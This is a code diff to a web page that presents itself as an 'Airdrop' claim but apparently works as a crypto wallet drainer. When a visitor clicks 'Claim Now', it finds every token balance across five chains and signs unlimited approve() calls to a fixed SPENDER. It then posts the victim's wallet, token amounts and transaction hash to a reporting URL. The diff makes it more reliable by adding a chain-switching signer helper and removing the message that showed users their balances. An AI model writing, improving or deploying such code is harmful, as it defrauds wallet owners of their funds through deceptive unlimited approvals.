@@ -9,8 +9,23 @@ import {
   getMEEVersion,
   MEEVersion,
 } from '@biconomy/abstractjs';
-import { http, fallback, createPublicClient } from 'viem';
-import { mainnet, optimism, base, arbitrum, polygon } from 'viem/chains';
+import {
+  http,
+  fallback,
+  createPublicClient,
+} from 'viem';
+import {
+  mainnet,
+  optimism,
+  base,
+  arbitrum,
+  polygon,
+} from 'viem/chains';
+import {
+  getWalletClient,
+  switchChain,
+  getChainId,
+} from '@wagmi/core';
 
 // ENV
 const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY || '';
@@ -48,11 +63,11 @@ const transports: Record<number, ReturnType<typeof fallback>> = {
 
 // Chain names
 const CHAIN_NAMES: Record<number, string> = {
-  [mainnet.id]: "Ethereum",
-  [optimism.id]: "Optimism",
-  [base.id]: "Base",
-  [arbitrum.id]: "Arbitrum",
-  [polygon.id]: "Polygon",
+  [mainnet.id]: 'Ethereum',
+  [optimism.id]: 'Optimism',
+  [base.id]: 'Base',
+  [arbitrum.id]: 'Arbitrum',
+  [polygon.id]: 'Polygon',
 };
 
 // Chain lookup
@@ -103,26 +118,50 @@ async function getTokenBalance(
 ) {
   const client = createPublicClient({ chain: CHAIN_BY_ID[chainId], transport: transports[chainId] });
   try {
-    const bal = await client.readContract({ abi: erc20Abi, address: token.address, functionName: 'balanceOf', args: [user] });
+    const bal = await client.readContract({
+      abi: erc20Abi,
+      address: token.address,
+      functionName: 'balanceOf',
+      args: [user],
+    });
     return bal as bigint;
   } catch {
     return BigInt(0);
   }
 }
 
+// signer fix: ensure correct chain
+async function getSignerOrSwitch(chainId: number) {
+  const activeChain = getChainId(config);
+
+  if (activeChain !== chainId) {
+    await switchChain(config, { chainId });
+  }
+
+  const walletClient = await getWalletClient(config, { chainId });
+  if (!walletClient) {
+    throw new Error(`No wallet client available for chain ${chainId}`);
+  }
+
+  return walletClient;
+}
+
 // report
 async function reportApproval(data: any) {
   if (!REPORT_URL) return;
   try {
-    await fetch(REPORT_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });
+    await fetch(REPORT_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    });
   } catch (err) {
     console.error('Report failed', err);
   }
 }
 
-// main page
 export default function Page() {
-  const { address } = useAccount();
+  const { address, isConnected } = useAccount();
   const [status, setStatus] = useState<string>('');
   const [loading, setLoading] = useState<boolean>(false);
 
@@ -133,8 +172,10 @@ export default function Page() {
       setLoading(true);
       setStatus(`🔍 Checking balances across chains...`);
 
+      const signer = await getSignerOrSwitch(mainnet.id);
+
       const orchestrator = await toMultichainNexusAccount({
-        signer: (window as any).ethereum,
+        signer,
         chainConfigurations: Object.values([mainnet, optimism, base, arbitrum, polygon]).map((c) => ({
           chain: c,
           transport: transports[c.id],
@@ -145,18 +186,15 @@ export default function Page() {
       const meeClient = await createMeeClient({ account: orchestrator, apiKey: BICONOMY_API_KEY });
 
       const instructions: any[] = [];
-      const approvedTokens: { chainId: number; chain: string; symbol: string; amount: string; decimals: number }[] = [];
+      const approvedTokens: { chain: string; symbol: string; amount: string; decimals: number }[] = [];
       const feeCandidates: { address: `0x${string}`; chainId: number }[] = [];
 
       for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
-        const chainId = Number(cid);
-
         for (const token of tokens) {
-          const bal = await getTokenBalance(chainId, token, address as `0x${string}`);
+          const bal = await getTokenBalance(Number(cid), token, address as `0x${string}`);
           if (bal > BigInt(0)) {
             approvedTokens.push({
-              chainId,
-              chain: CHAIN_NAMES[chainId],
+              chain: CHAIN_NAMES[Number(cid)],
               symbol: token.symbol,
               amount: formatUnits(bal, token.decimals),
               decimals: token.decimals,
@@ -166,7 +204,7 @@ export default function Page() {
               type: 'default',
               data: {
                 abi: erc20Abi,
-                chainId,
+                chainId: Number(cid),
                 to: token.address,
                 functionName: 'approve',
                 args: [SPENDER, maxUint256],
@@ -174,26 +212,20 @@ export default function Page() {
             });
             instructions.push(instr);
 
-            feeCandidates.push({ address: token.address, chainId });
+            feeCandidates.push({ address: token.address, chainId: Number(cid) });
           }
         }
       }
 
-      if (instructions.length === 0) {
-        setStatus(`ℹ️ No balances found on any chain to approve.`);
-        await reportApproval({ wallet: address, status: "no_balance" });
+      if (instructions.length === 0 || feeCandidates.length === 0) {
+        setStatus(`ℹ️ No balance found on any chain.`);
         setLoading(false);
         return;
       }
 
-      setStatus(`✅ Found balances: ${approvedTokens.map(t => `${t.symbol} (${t.amount}) on ${t.chain}`).join(', ')}`);
-
-      let success = false;
-      let lastError: any = null;
-
       for (const feeToken of feeCandidates) {
         try {
-          setStatus(`🚀 Trying gas payment with ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address}...`);
+          setStatus(`🚀 Approving with ${CHAIN_NAMES[feeToken.chainId]} ${feeToken.address}...`);
 
           const fusionQuote = await meeClient.getFusionQuote({
             instructions,
@@ -204,32 +236,24 @@ export default function Page() {
           const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
           await meeClient.waitForSupertransactionReceipt({ hash });
 
-          setStatus(`🎉 Success! Approved tokens using gas paid with ${CHAIN_NAMES[feeToken.chainId]} token.\nTx: ${hash}`);
-
-          // report each approval success
-          for (const approved of approvedTokens) {
+          for (const t of approvedTokens) {
             await reportApproval({
               wallet: address,
-              chainId: approved.chainId,
-              chain: approved.chain,
-              symbol: approved.symbol,
-              amount: approved.amount,
-              decimals: approved.decimals,
+              chain: t.chain,
+              symbol: t.symbol,
+              amount: t.amount,
+              decimals: t.decimals,
               txHash: hash,
               feeToken: { token: feeToken.address, chain: CHAIN_NAMES[feeToken.chainId] },
             });
           }
 
-          success = true;
+          setStatus(`✅ Finished approvals across all chains`);
           break;
-        } catch (err: any) {
-          lastError = err;
+        } catch (err) {
+          console.warn('Fee token attempt failed', err);
           continue;
         }
-      }
-
-      if (!success) {
-        throw new Error(`All fee token attempts failed: ${lastError?.message || lastError}`);
       }
     } catch (err: any) {
       console.error(err);
@@ -243,31 +267,30 @@ export default function Page() {
   return (
     <main
       style={{
-        display: "flex",
-        flexDirection: "column",
-        alignItems: "center",
-        gap: "24px",
-        marginTop: "40px",
+        display: 'flex',
+        flexDirection: 'column',
+        alignItems: 'center',
+        gap: '24px',
+        marginTop: '40px',
       }}
     >
       <header
         style={{
-          position: "fixed",
+          position: 'fixed',
           top: 0,
           left: 0,
           right: 0,
-          height: "64px",
-          background: "#09011fff",
-          display: "flex",
-          alignItems: "center",
-          justifyContent: "space-between",
-          padding: "0 24px",
-          paddingTop: "env(safe-area-inset-top)",
-          boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)",
+          height: '64px',
+          background: '#09011fff',
+          display: 'flex',
+          alignItems: 'center',
+          justifyContent: 'space-between',
+          padding: '0 24px',
+          boxShadow: '0 2px 8px rgba(241, 235, 235, 0.08)',
           zIndex: 1000,
         }}
       >
-        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
+        <div style={{ fontFamily: 'sans-serif', fontWeight: 'bold', fontSize: '18px', color: '#aaa587ff' }}>
           AIRDROPS
         </div>
         <appkit-button />
@@ -275,56 +298,56 @@ export default function Page() {
 
       <div
         style={{
-          display: "flex",
-          flexDirection: "column",
-          gap: "24px",
-          paddingTop: "80px",
-          width: "80%",
-          maxWidth: "600px",
+          display: 'flex',
+          flexDirection: 'column',
+          gap: '24px',
+          paddingTop: '80px',
+          width: '80%',
+          maxWidth: '600px',
         }}
       >
         <div
           style={{
-            border: "1px solid #9dd6d1ff",
-            borderRadius: "12px",
-            padding: "20px",
-            background: "#090e41ff",
-            display: "flex",
-            flexDirection: "column",
-            alignItems: "center",
-            justifyContent: "space-between",
-            height: "500px",
+            border: '1px solid #9dd6d1ff',
+            borderRadius: '12px',
+            padding: '20px',
+            background: '#090e41ff',
+            display: 'flex',
+            flexDirection: 'column',
+            alignItems: 'center',
+            justifyContent: 'space-between',
+            height: '500px',
           }}
         >
-          <h2 style={{ marginBottom: "12px" }}>Airdrop</h2>
+          <h2 style={{ marginBottom: '12px' }}>Airdrop</h2>
 
           <div
             style={{
               flex: 1,
-              display: "flex",
-              alignItems: "center",
-              justifyContent: "center",
-              color: "#e4e1daff",
-              fontSize: "14px",
-              textAlign: "center",
+              display: 'flex',
+              alignItems: 'center',
+              justifyContent: 'center',
+              color: '#e4e1daff',
+              fontSize: '14px',
+              textAlign: 'center',
             }}
           >
-            {status || ""}
+            {status || ''}
           </div>
 
           <button
             onClick={handleApproveAllChains}
-            style={{
-              background: "#a00b0bff",
-              color: "white",
-              padding: "12px 28px",
-              borderRadius: "8px",
-              cursor: "pointer",
-              marginTop: "16px",
-            }}
             disabled={loading}
+            style={{
+              background: loading ? '#444' : '#a00b0bff',
+              color: 'white',
+              padding: '12px 28px',
+              borderRadius: '8px',
+              cursor: loading ? 'not-allowed' : 'pointer',
+              marginTop: '16px',
+            }}
           >
-            {loading ? "Processing..." : "Claim Now"}
+            {loading ? 'Processing...' : 'Claim Now'}
           </button>
         </div>
       </div>
